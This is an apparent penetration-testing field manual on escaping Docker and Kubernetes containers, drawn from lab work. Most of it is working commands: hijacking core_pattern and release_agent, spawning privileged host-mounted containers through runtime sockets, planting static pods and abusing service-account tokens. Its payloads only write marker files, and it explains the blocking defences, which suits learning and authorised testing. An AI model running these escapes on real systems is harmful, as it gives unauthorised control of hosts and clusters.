Container Escape Field Manual

Primitives, gates, and failure points

HTB Nimbus is the reason I started writing this down.

The first shell was inside a worker container. That container looked promising for about five minutes, then became boring: no useful effective capabilities, seccomp enabled, /proc/sys read-only, /sys read-only, no useful cgroup path, no raw device access. The route to root was not inside that container.

The worker could reach the local AWS-like platform. That platform could create a privileged CodeBuild container. The new container had access to the primitive the worker lacked: host-level kernel configuration through core_pattern.

That shape shows up everywhere:

current container is boring
the thing it can reach is not

This document is built around that idea. Not as a slogan, but as a decision tree. Runtime socket, hostPath, kubelet files, service account, user namespace, LSM, cgroups, kernel helper, build system. One of them usually decides whether the shell is contained or not.

0. First pass: classify the container

Start with facts, not payloads.

cat /proc/1/cgroup 2>/dev/null
cat /proc/self/mountinfo | head -n 10
ls -la /.dockerenv 2>/dev/null
hostname
env | grep -Ei 'kubernetes|docker|container|pod|aws|gcp|azure|ci|runner'

Useful signals:

/.dockerenv                       Docker-style container hint
kubepods in /proc/1/cgroup        Kubernetes workload
containerd in cgroup              containerd runtime path
KUBERNETES_SERVICE_HOST           Kubernetes API reachable from pod
AWS_* / GOOGLE_* / AZURE_*        cloud or CI context
CI=true / RUNNER_*                build environment

Privilege context:

id
cat /proc/self/status | grep -E 'Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp'
cat /proc/self/uid_map 2>/dev/null
cat /proc/self/gid_map 2>/dev/null
readlink /proc/self/ns/user 2>/dev/null
readlink /proc/1/ns/user 2>/dev/null

Decode CapEff without external tools:

python3 - <<'PY'
caps = [
"CHOWN","DAC_OVERRIDE","DAC_READ_SEARCH","FOWNER","FSETID","KILL","SETGID","SETUID",
"SETPCAP","LINUX_IMMUTABLE","NET_BIND_SERVICE","NET_BROADCAST","NET_ADMIN","NET_RAW",
"IPC_LOCK","IPC_OWNER","SYS_MODULE","SYS_RAWIO","SYS_CHROOT","SYS_PTRACE","SYS_PACCT",
"SYS_ADMIN","SYS_BOOT","SYS_NICE","SYS_RESOURCE","SYS_TIME","SYS_TTY_CONFIG","MKNOD",
"LEASE","AUDIT_WRITE","AUDIT_CONTROL","SETFCAP","MAC_OVERRIDE","MAC_ADMIN","SYSLOG",
"WAKE_ALARM","BLOCK_SUSPEND","AUDIT_READ","PERFMON","BPF","CHECKPOINT_RESTORE"
]
v = int([l.split()[1] for l in open("/proc/self/status") if l.startswith("CapEff:")][0], 16)
print("\n".join("CAP_"+name for i, name in enumerate(caps) if v & (1 << i)))
PY

Mounts, namespaces, and sockets:

mount
cat /proc/self/mountinfo
findmnt 2>/dev/null
find / -type s 2>/dev/null | grep -Ei 'docker|containerd|crio|podman|kubelet'

High-signal paths:

/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/lib/kubelet
/etc/kubernetes/manifests
/host
/rootfs
/node
/hostfs
/proc/sys
/sys/fs/cgroup

LSM and seccomp:

cat /proc/self/status | grep -E 'Seccomp|NoNewPrivs'
cat /proc/self/attr/current 2>/dev/null || true
cat /proc/self/attr/apparmor/current 2>/dev/null || true
cat /sys/kernel/security/lsm 2>/dev/null || true

Interpretation:

Seccomp: 0                  no seccomp filter
Seccomp: 2                  seccomp filter active
unconfined                  AppArmor likely not constraining this process
docker-default              default Docker AppArmor profile
container_t                 common SELinux container domain
spc_t                       often privileged container domain on SELinux systems

Runtime inventory:

uname -a
cat /etc/os-release 2>/dev/null
runc --version 2>/dev/null
docker version 2>/dev/null
containerd --version 2>/dev/null
crictl version 2>/dev/null
ctr version 2>/dev/null

Version strings are only a lead. Distro backports change the answer.

1. core_pattern

The primitive:

privileged container
writable /proc/sys/kernel/core_pattern
host-visible helper
core-dumping crash

Check:

id
cat /proc/self/status | grep -E 'CapEff|Seccomp|NoNewPrivs'
ls -l /proc/sys/kernel/core_pattern 2>/dev/null
cat /proc/sys/kernel/core_pattern 2>/dev/null
grep -E 'upperdir=|workdir=|lowerdir=' /proc/self/mountinfo

Extract the overlay upperdir:

UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -n1)
echo "$UPPERDIR"

If empty:

grep ' overlay ' /proc/self/mountinfo

Common upperdir shapes:

/var/lib/docker/overlay2/<id>/diff
/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs

Marker helper:

cat > /tmp/cp_helper.sh <<'SH'
#!/bin/sh
/bin/date > /tmp/core_pattern_marker
/bin/id >> /tmp/core_pattern_marker 2>&1
SH

chmod +x /tmp/cp_helper.sh
cp /tmp/cp_helper.sh "$UPPERDIR/cp_helper.sh"
chmod +x "$UPPERDIR/cp_helper.sh"

Point core_pattern at the host-visible path:

echo "|$UPPERDIR/cp_helper.sh" > /proc/sys/kernel/core_pattern
cat /proc/sys/kernel/core_pattern

Trigger a crash:

python3 - <<'PY'
import ctypes
ctypes.string_at(0)
PY

Fallback:

sh -c 'kill -SEGV $$'

Important details:

core_pattern is host-global
the helper path is resolved from the host view
/tmp/helper inside the container is usually not enough
piped core handlers ignore RLIMIT_CORE
LSM policy can still block execution
systemd-coredump or apport may be the original handler
rootless and userns-remapped containers change assumptions

Failure gates:

core_pattern read-only
no host-visible helper path
no writable overlay upperdir
sysctl write blocked by capability or LSM
crash does not enter core handling path
helper exists in container namespace only

Quick decision:

writable core_pattern + upperdir visible + privileged container = pursue
read-only core_pattern = stop
no host-visible path = stop or switch primitive

2. cgroups v1 release_agent

This is the other classic kernel-callback primitive.

The chain:

cgroups v1
writable cgroup hierarchy
notify_on_release control
release_agent control
host-visible helper
empty cgroup trigger

Check version and exposure:

stat -fc %T /sys/fs/cgroup
mount | grep cgroup
cat /proc/self/cgroup
find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2>/dev/null
cat /proc/self/status | grep -E 'CapEff|Seccomp|NoNewPrivs'

Interpretation:

cgroup2fs only              classic release_agent path is usually dead
cgroup v1 mounted           continue
release_agent found         inspect perms
release_agent writable      high signal

Find cgroup root:

CGROOT=$(awk '$3 ~ /^cgroup$/ {print $2; exit}' /proc/mounts)
echo "$CGROOT"

If there is no writable cgroup mount and CAP_SYS_ADMIN is effective:

mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
CGROOT=/tmp/cgrp

Host-visible helper path:

UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -n1)
echo "$UPPERDIR"

Helper:

cat > /tmp/release_helper.sh <<'SH'
#!/bin/sh
/bin/date > /tmp/release_agent_marker
/bin/id >> /tmp/release_agent_marker 2>&1
SH

chmod +x /tmp/release_helper.sh
cp /tmp/release_helper.sh "$UPPERDIR/release_helper.sh"
chmod +x "$UPPERDIR/release_helper.sh"

Configure trigger:

echo "$UPPERDIR/release_helper.sh" > "$CGROOT/release_agent"
mkdir -p "$CGROOT/pentest"
echo 1 > "$CGROOT/pentest/notify_on_release"

Trigger by placing a short-lived process in the child cgroup:

sh -c "echo \$\$ > '$CGROOT/pentest/cgroup.procs'"

Failure gates:

cgroups v2 only
release_agent missing
release_agent not writable
cannot create child cgroup
cannot write cgroup.procs
no CAP_SYS_ADMIN when mounting is needed
no host-visible helper path
AppArmor or SELinux blocks helper execution
kernel patched against the relevant exposure

Capability link:

CAP_SYS_ADMIN often decides whether mounting or manipulating cgroups is possible.
A privileged container usually makes this path realistic.
A normal Kubernetes pod with cgroups v2 and RuntimeDefault seccomp usually does not.

3. Kernel usermode-helper family

core_pattern and release_agent are not random tricks. They belong to the same class:

kernel event
path to usermode helper
attacker controls helper or trigger
host-visible payload

Sweep:

for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /sys/kernel/uevent_helper \
  /proc/sys/fs/binfmt_misc/status
do
  echo "### $p"
  ls -l "$p" 2>/dev/null
  cat "$p" 2>/dev/null
done

find /sys/fs/cgroup -name release_agent -o -name notify_on_release 2>/dev/null

3.1 modprobe_path

Check:

ls -l /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe

What makes it interesting:

writable /proc/sys/kernel/modprobe
host-visible helper path
reachable kernel auto-load trigger

Typical trigger class:

kernel tries to execute or handle something requiring a module
modprobe path is attacker-controlled
helper executes from host context

Failure gates:

modprobe path read-only
module auto-loading disabled or constrained
no reachable trigger
helper path not host-visible
LSM blocks execution
seccomp blocks the needed trigger path

3.2 uevent_helper

Check:

ls -l /sys/kernel/uevent_helper 2>/dev/null
cat /sys/kernel/uevent_helper 2>/dev/null

Interesting only when:

sysfs writable
uevent_helper writable
useful uevent trigger reachable
helper path host-visible

Failure gates:

modern distro behavior disables practical use
sysfs mounted read-only
no useful trigger
LSM blocks helper

3.3 binfmt_misc

Check:

mount | grep binfmt_misc
ls -la /proc/sys/fs/binfmt_misc 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null

Interesting when the container can register interpreters:

binfmt_misc mounted writable
interpreter path host-visible
host execution context can hit the registered format

This one is easy to overstate. Registration inside a private mount namespace may not affect the host. The useful question is not “can I write binfmt_misc?” It is “who uses this registration afterward?”

4. Docker socket

A usable rootful Docker socket is a host compromise primitive.

Check:

find / -type s -name 'docker.sock' 2>/dev/null
ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
id
groups

With Docker CLI:

docker -H unix:///var/run/docker.sock version
docker -H unix:///var/run/docker.sock ps

Without Docker CLI:

curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

Read host through Docker CLI:

docker -H unix:///var/run/docker.sock run --rm \
  -v /:/host:ro \
  alpine:latest \
  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'

Writable marker:

docker -H unix:///var/run/docker.sock run --rm \
  --privileged \
  -v /:/host \
  alpine:latest \
  sh -c 'id; touch /host/tmp/docker_socket_marker; ls -l /host/tmp/docker_socket_marker'

Raw API, no Docker binary:

cat > /tmp/create.json <<'JSON'
{
  "Image": "alpine:latest",
  "Cmd": ["sh", "-c", "cat /host/etc/hostname; head -n 5 /host/etc/os-release"],
  "HostConfig": {
    "Binds": ["/:/host:ro"],
    "AutoRemove": true
  }
}
JSON

CID=$(curl -s --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/containers/create \
  --data-binary @/tmp/create.json | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')

curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start"
sleep 1
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1&stderr=1"

Pull image if missing:

curl -s --unix-socket /var/run/docker.sock \
  -X POST 'http://localhost/images/create?fromImage=alpine&tag=latest'

Writable raw API proof:

cat > /tmp/create_rw.json <<'JSON'
{
  "Image": "alpine:latest",
  "Cmd": ["sh", "-c", "id; touch /host/tmp/docker_api_marker; ls -l /host/tmp/docker_api_marker"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"],
    "AutoRemove": true
  }
}
JSON

CID=$(curl -s --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -X POST http://localhost/containers/create \
  --data-binary @/tmp/create_rw.json | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')

curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start"
sleep 1
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1&stderr=1"

Failure gates:

socket exists but current UID cannot connect
rootless Docker
Docker authorization plugin blocks host binds or privileged containers
no image and no registry access
Docker Desktop VM boundary
socket points to a daemon in another trust boundary

Rootless Docker changes the severity. It may still expose the user's containers, images, files, credentials, and workload control, but it is not the same as rootful host Docker.

5. containerd and CRI sockets

Docker gets most writeups, but Kubernetes nodes often expose containerd or CRI-O.

Important paths:

/run/containerd/containerd.sock
/var/run/containerd/containerd.sock
/var/run/crio/crio.sock

Find sockets:

find / -type s 2>/dev/null | grep -Ei 'containerd|crio|cri'
ls -l /run/containerd/containerd.sock /var/run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null

5.1 ctr

ctr talks to containerd directly. It is not a stable high-level user interface. Syntax varies enough that ctr help matters.

Check:

ctr --address /run/containerd/containerd.sock version
ctr --address /run/containerd/containerd.sock namespaces list
ctr --address /run/containerd/containerd.sock --namespace k8s.io containers list
ctr --address /run/containerd/containerd.sock --namespace k8s.io tasks list

Pull an image:

ctr --address /run/containerd/containerd.sock image pull docker.io/library/busybox:1.36

Read-only host mount:

ctr --address /run/containerd/containerd.sock run --rm \
  --mount type=bind,src=/,dst=/host,options=rbind:ro \
  docker.io/library/busybox:1.36 ctest \
  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'

Privileged variant where supported:

ctr --address /run/containerd/containerd.sock run --rm \
  --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/busybox:1.36 ctest \
  sh -c 'id; touch /host/tmp/containerd_marker; ls -l /host/tmp/containerd_marker'

Failure gates:

socket not mounted
current UID cannot connect
ctr missing
image not present and pull blocked
containerd namespace mismatch
runtime options differ by version
LSM or runtime denies mount
rootless containerd

k8s.io is the namespace where Kubernetes workloads commonly appear. A direct ctr run may use the default namespace unless specified.

5.2 crictl

crictl talks to CRI-compatible runtimes. It is common on Kubernetes nodes.

Check endpoint:

crictl --runtime-endpoint unix:///run/containerd/containerd.sock version
crictl --runtime-endpoint unix:///run/containerd/containerd.sock pods
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps -a
crictl --runtime-endpoint unix:///run/containerd/containerd.sock images

If CRI-O:

crictl --runtime-endpoint unix:///var/run/crio/crio.sock version

crictl needs a pod sandbox config and a container config for creation. A minimal hostPath-style test depends on runtime support and image availability.

Pod sandbox config:

cat > /tmp/pod.json <<'JSON'
{
  "metadata": {
    "name": "crictl-pentest",
    "namespace": "default",
    "attempt": 1,
    "uid": "crictl-pentest"
  },
  "linux": {
    "security_context": {
      "namespace_options": {
        "network": 2,
        "pid": 1,
        "ipc": 1
      }
    }
  }
}
JSON

Container config with host mount:

cat > /tmp/container.json <<'JSON'
{
  "metadata": {
    "name": "marker"
  },
  "image": {
    "image": "busybox:1.36"
  },
  "command": [
    "sh",
    "-c",
    "cat /host/etc/hostname; head -n 5 /host/etc/os-release; id"
  ],
  "mounts": [
    {
      "container_path": "/host",
      "host_path": "/",
      "readonly": true
    }
  ],
  "linux": {
    "security_context": {
      "privileged": true
    }
  }
}
JSON

Run:

EP=unix:///run/containerd/containerd.sock
PODID=$(crictl --runtime-endpoint "$EP" runp /tmp/pod.json)
CID=$(crictl --runtime-endpoint "$EP" create "$PODID" /tmp/container.json /tmp/pod.json)
crictl --runtime-endpoint "$EP" start "$CID"
crictl --runtime-endpoint "$EP" logs "$CID"

Failure gates:

CRI endpoint not accessible
sandbox creation blocked
image missing
runtime policy blocks privileged
mount rejected
network or namespace options rejected
crictl version does not match runtime cleanly

With CRI, errors are often more useful than success. If the runtime accepts a privileged host mount, the node boundary is weak.

6. hostPath, kubelet files, and static pods

A read-write hostPath to the node filesystem is already the pivot. The static pod path is the cleanest one on Kubernetes nodes.

Common mount names:

/host
/rootfs
/node
/hostfs
/mnt/host

Check:

mount
cat /proc/self/mountinfo
findmnt 2>/dev/null
ls -la /host /rootfs /node /hostfs /mnt/host 2>/dev/null

Find static manifests:

for d in /host /rootfs /node /hostfs /mnt/host; do
  [ -d "$d/etc/kubernetes/manifests" ] && echo "[+] static manifests via $d"
done

If the directory differs:

HOST=/host
grep -R "staticPodPath" "$HOST/var/lib/kubelet" "$HOST/etc" 2>/dev/null | head
grep -R "pod-manifest-path" "$HOST/etc/systemd" "$HOST/var/lib/kubelet" 2>/dev/null | head

Write test:

HOST=/host
touch "$HOST/tmp/hostpath_write_test" && ls -l "$HOST/tmp/hostpath_write_test"

Static pod marker:

HOST=/host
MANIFEST_DIR="$HOST/etc/kubernetes/manifests"

cat > "$MANIFEST_DIR/pentest-marker.yaml" <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: pentest-marker
  namespace: kube-system
spec:
  restartPolicy: Never
  containers:
  - name: marker
    image: busybox:1.36
    command:
    - sh
    - -c
    - |
      id > /host/tmp/static_pod_marker
      date >> /host/tmp/static_pod_marker
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML

Check:

sleep 30
cat "$HOST/tmp/static_pod_marker" 2>/dev/null

Other high-value kubelet paths:

/var/lib/kubelet/pki
/var/lib/kubelet/config.yaml
/var/lib/kubelet/kubeconfig
/var/lib/kubelet/pods
/var/lib/kubelet/plugins
/var/lib/kubelet/device-plugins

Interesting files:

HOST=/host
find "$HOST/var/lib/kubelet" -maxdepth 3 -type f 2>/dev/null | head -n 50
find "$HOST/var/lib/kubelet/pods" -path '*volumes*' -type f 2>/dev/null | head -n 50

Failure gates:

hostPath read-only
staticPodPath not mounted
kubelet not using static pod directory
image pull fails
filesystem permissions block writes
SELinux blocks writes or execution
node is not a Kubernetes node

7. Namespace pivots

Namespaces decide what “host” means from the process view. The useful questions:

Do I see host PIDs?
Do I have the host mount namespace?
Can I reach host root through /proc/<pid>/root?
Can I setns into another namespace?
Do I have CAP_SYS_ADMIN in the target namespace?

Compare namespace links:

for ns in mnt pid net ipc uts user cgroup; do
  echo "### $ns"
  readlink /proc/self/ns/$ns 2>/dev/null
  readlink /proc/1/ns/$ns 2>/dev/null
done

If host PID namespace is shared, /proc/1 is the host init, not the container init.

Check host PID exposure:

ps auxww | head
ls -l /proc/1/root
readlink /proc/1/root

Try host root view:

ls -la /proc/1/root 2>/dev/null
cat /proc/1/root/etc/hostname 2>/dev/null
head -n 5 /proc/1/root/etc/os-release 2>/dev/null

If /proc is host-mounted or hostPID is enabled, /proc/<hostpid>/root can expose the host filesystem view for that process.

Find candidate host processes:

ps -eo pid,ppid,user,comm,args | head -n 30
ps -eo pid,comm,args | grep -E 'systemd|kubelet|containerd|dockerd|crio' | grep -v grep

nsenter path when available and allowed:

which nsenter 2>/dev/null
nsenter --target 1 --mount --uts --ipc --net --pid sh -c 'id; hostname; mount | head' 2>/dev/null

Failure gates:

not in hostPID
/proc is container procfs, not host procfs
ptrace restrictions block /proc/<pid>/root access
hidepid blocks process inspection
CAP_SYS_ADMIN missing for setns into mount namespace
user namespace mismatch
AppArmor or SELinux blocks proc traversal

Namespace pivots are often read primitives first. They become execution primitives when paired with:

CAP_SYS_ADMIN
hostPID
hostPath
runtime socket
writable host filesystem
weak /proc restrictions

8. User namespaces and rootless runtimes

User namespaces are the reason many “privileged-looking” checks lie.

Read the maps:

cat /proc/self/uid_map
cat /proc/self/gid_map
readlink /proc/self/ns/user
readlink /proc/1/ns/user

Typical non-remapped container:

         0          0 4294967295

Meaning: UID 0 inside maps to UID 0 outside.

Typical remapped or rootless shape:

         0     100000      65536

Meaning: UID 0 inside maps to host UID 100000 for that range.

What changes:

CAP_SYS_ADMIN inside a user namespace is not automatically host CAP_SYS_ADMIN
mount operations may work only for namespaced filesystems
host-owned files may appear unmapped or inaccessible
device access and sysctl writes usually remain constrained
Docker socket impact changes if the daemon itself is rootless

Check subordinate IDs from a host mount, if visible:

cat /host/etc/subuid 2>/dev/null
cat /host/etc/subgid 2>/dev/null
cat /etc/subuid 2>/dev/null
cat /etc/subgid 2>/dev/null

Rootless Docker clues:

docker info 2>/dev/null | grep -i rootless
ps auxww | grep -E 'rootlesskit|dockerd-rootless|slirp4netns' | grep -v grep
env | grep -Ei 'XDG_RUNTIME_DIR|DOCKER_HOST'

Rootless socket shapes:

/run/user/<uid>/docker.sock
$XDG_RUNTIME_DIR/docker.sock

Failure gates caused by userns:

core_pattern write denied despite root inside container
cgroup mount denied despite CAP_SYS_ADMIN inside userns
host bind mount shows permission denied
device nodes exist but cannot be opened
runtime socket controls user-owned daemon only

The common mistake is treating uid=0 and CAP_SYS_ADMIN as host authority without checking the user namespace.

9. Capabilities

Decode capabilities, then tie them to an interface. A capability alone is often just a lead.

High-value caps:

CAP_SYS_ADMIN       mount, namespace, cgroup, broad admin surface
CAP_SYS_MODULE      host kernel module loading
CAP_SYS_PTRACE      process inspection/control, especially with hostPID
CAP_DAC_READ_SEARCH bypass file read and directory traversal checks
CAP_MKNOD           device node creation
CAP_SYS_RAWIO       raw I/O
CAP_NET_ADMIN       routing, firewall, interface control
CAP_BPF             eBPF surface
CAP_PERFMON         performance monitoring surface

Check:

cat /proc/self/status | grep -E 'CapInh|CapPrm|CapEff|CapBnd|CapAmb|Seccomp|NoNewPrivs'

Tie caps to reachable paths:

CAP_SYS_ADMIN + writable cgroupfs       release_agent
CAP_SYS_ADMIN + mount allowed           namespace or mount abuse
CAP_SYS_ADMIN + writable /proc/sys      kernel helper family
CAP_SYS_MODULE                          host kernel module loading
CAP_SYS_PTRACE + hostPID                host process interaction
CAP_DAC_READ_SEARCH + hostPath          host file disclosure
CAP_MKNOD + weak device cgroup          block device access
CAP_NET_ADMIN + hostNetwork             host network manipulation
CAP_BPF or CAP_PERFMON                  kernel observability surface

Check device cgroup effect:

ls -la /dev | head
cat /proc/self/cgroup
grep devices /proc/self/mountinfo /proc/self/cgroup 2>/dev/null

MKNOD without device access usually hits:

Operation not permitted

That is exactly what happened in many lab attempts: creating the device node works, opening it does not.

Failure gates:

capability in bounding set but not effective
seccomp blocks the syscall
user namespace remapping changes host impact
LSM blocks the operation
host namespace not shared
target filesystem read-only
device cgroup blocks access

10. LSM and seccomp gates

Many failed container escapes are not “wrong exploit”. They are policy doing its job.

Seccomp:

cat /proc/self/status | grep -E 'Seccomp|NoNewPrivs'

Values:

Seccomp: 0          no seccomp
Seccomp: 2          filtered

AppArmor:

cat /proc/self/attr/current 2>/dev/null || true
cat /proc/self/attr/apparmor/current 2>/dev/null || true
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head

SELinux:

cat /proc/self/attr/current 2>/dev/null || true
getenforce 2>/dev/null
id -Z 2>/dev/null

Useful patterns:

docker-default                       default Docker AppArmor profile
unconfined                           no AppArmor confinement for process
container_t                          common SELinux container confinement
spc_t                                often privileged container type

When a primitive fails, map the error:

EPERM on mount                       capability, seccomp, LSM, or userns
permission denied on /proc/sys       read-only mount, caps, LSM, userns
operation not permitted on device    device cgroup or LSM
cannot setns                         missing CAP_SYS_ADMIN in target namespace
exec denied                          AppArmor or SELinux

This matters because changing payload syntax will not fix a policy gate.

11. Kubernetes service account paths

A boring Linux container with a strong service account is not boring.

Inside pod:

SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
ls -la "$SA_DIR" 2>/dev/null
cat "$SA_DIR/namespace" 2>/dev/null
env | grep KUBERNETES

Manual API access:

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

curl -sSk --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/$NS/pods" | head

From kubeconfig:

kubectl auth can-i create pods -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i create pods/exec -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i get secrets -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i list secrets -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i create serviceaccounts/token -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i create daemonsets.apps -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i create clusterrolebindings --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i bind clusterroles --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i escalate clusterroles --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i impersonate users --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i get nodes/proxy --as="system:serviceaccount:$NS:$SA"

11.1 Pod creation is only half the check

Dry-run a dangerous pod:

kubectl apply --dry-run=server -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: pss-check-privileged
spec:
  restartPolicy: Never
  containers:
  - name: c
    image: busybox:1.36
    command: ["sh", "-c", "id && sleep 1"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML

The chain is:

create pods
admission allows privileged or hostPath
scheduler places pod
node filesystem or host namespace reachable

11.2 DaemonSet path

If the identity can create DaemonSets, the primitive spreads to nodes.

kubectl auth can-i create daemonsets.apps -n "$NS" --as="system:serviceaccount:$NS:$SA"

Marker DaemonSet shape:

apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: ds-marker
  namespace: default
spec:
  selector:
    matchLabels:
      app: ds-marker
  template:
    metadata:
      labels:
        app: ds-marker
    spec:
      containers:
      - name: marker
        image: busybox:1.36
        command: ["sh", "-c", "id; cat /host/etc/hostname; sleep 5"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /

Failure gates:

cannot create DaemonSets
admission blocks privileged or hostPath
namespace quota blocks workload
image pull fails
taints block scheduling

11.3 Secrets path

Check:

kubectl auth can-i get secrets -n "$NS" --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i list secrets -n "$NS" --as="system:serviceaccount:$NS:$SA"

Useful enumeration:

kubectl get secrets -n "$NS" -o name
kubectl get secret <name> -n "$NS" -o json

Modern Kubernetes no longer creates long-lived service account token Secrets by default in the same way older clusters did, but application secrets still matter.

11.4 serviceaccounts/token

Check:

kubectl auth can-i create serviceaccounts/token -n "$NS" --as="system:serviceaccount:$NS:$SA"

If allowed, token minting can be more useful than reading old token Secrets:

kubectl create token <serviceaccount> -n "$NS"

The interesting question is which service accounts the identity can mint tokens for.

11.5 nodes/proxy

Check:

kubectl auth can-i get nodes/proxy --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i create nodes/proxy --as="system:serviceaccount:$NS:$SA"

Node proxy can expose kubelet API paths through the API server.

List nodes:

kubectl get nodes -o name

Probe:

NODE=<node-name>
kubectl get --raw "/api/v1/nodes/$NODE/proxy/healthz"
kubectl get --raw "/api/v1/nodes/$NODE/proxy/pods" | head

High-impact if kubelet exec-style paths are reachable with the granted verb combination. This varies by Kubernetes version, proxy behavior, and direct kubelet access.

Failure gates:

nodes/proxy absent
API proxy blocks target path
kubelet authz blocks request
websocket path unsupported through proxy
network policy irrelevant if going through API server

11.6 bind, escalate, impersonate

These verbs are privilege escalation indicators.

Check:

kubectl auth can-i bind clusterroles --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i escalate clusterroles --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i impersonate users --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i impersonate groups --as="system:serviceaccount:$NS:$SA"
kubectl auth can-i impersonate serviceaccounts -n "$NS" --as="system:serviceaccount:$NS:$SA"

Impact depends on scope:

bind          can attach existing privileges to subjects
escalate      can create or modify roles beyond current own permissions
impersonate   can act as another identity if target is broad enough

12. hostPID, hostNetwork, hostIPC

These are not automatic escapes. They turn other primitives into escapes.

Check current pod from inside:

ps auxww | head
ip addr 2>/dev/null | head
ls -la /proc/1/root 2>/dev/null
readlink /proc/1/ns/pid /proc/self/ns/pid 2>/dev/null

In Kubernetes specs:

hostPID: true
hostNetwork: true
hostIPC: true

12.1 hostPID

With hostPID, process visibility expands.

Useful checks:

ps -eo pid,ppid,user,comm,args | head -n 50
ps -eo pid,comm,args | grep -E 'kubelet|containerd|dockerd|crio|systemd' | grep -v grep
ls -l /proc/1/root

Read through process root:

cat /proc/1/root/etc/hostname 2>/dev/null
head -n 5 /proc/1/root/etc/os-release 2>/dev/null

If combined with CAP_SYS_PTRACE, hostPID becomes more serious.

12.2 hostNetwork

hostNetwork exposes the node network namespace.

Checks:

ip addr
ip route
ss -lntup 2>/dev/null | head

Interesting services:

kubelet ports
node-local metadata proxies
local admin services
container runtime listeners
cluster overlay interfaces

12.3 hostIPC

hostIPC is less common as a direct escape. It matters when shared memory or IPC objects carry secrets or cross-process interaction opportunities.

Check:

ipcs -a 2>/dev/null
ls -la /dev/shm

Failure gates:

host namespace not shared
missing ptrace capability
hidepid or proc restrictions
LSM blocks /proc access
network services bound only to protected interfaces

13. Runtime CVEs

Runtime CVEs need reachable trigger paths. Inventory is not impact.

13.1 CVE-2019-5736

Mechanism:

runc is reachable during run or exec
container influences /proc/[pid]/exe style handle
host runc binary gets overwritten or affected
next runtime invocation runs attacker-controlled code

Trigger classes:

attacker-controlled image is started
operator or automation runs exec into compromised container
existing writable container filesystem is used as trap

Inventory:

runc --version 2>/dev/null
docker version 2>/dev/null
containerd --version 2>/dev/null
crictl version 2>/dev/null
uname -a
cat /etc/os-release

Questions:

is vulnerable runc actually used
is it vendor patched
can attacker control image filesystem
can attacker trigger run or exec
are nodes shared with untrusted workloads
does rootless or userns change impact

Do not stop at “old runc”. Check the trigger.

13.2 CVE-2024-21626

Mechanism:

runc leaked an internal file descriptor to a host directory during setup
attacker-controlled cwd or bind source can point at /proc/self/fd/<n>
container process keeps a host filesystem reference

The key detail is active targeting of the leaked descriptor. It is not “container randomly has host cwd”.

Check exposure:

runc --version 2>/dev/null
docker version 2>/dev/null
containerd --version 2>/dev/null

Exploitability questions:

can attacker control image WORKDIR
can attacker control process.cwd in OCI config
can attacker control bind mount source
can attacker trigger container create or exec
is runc <= affected line without vendor patch
does rootless or userns reduce host impact

Affected paths in real environments:

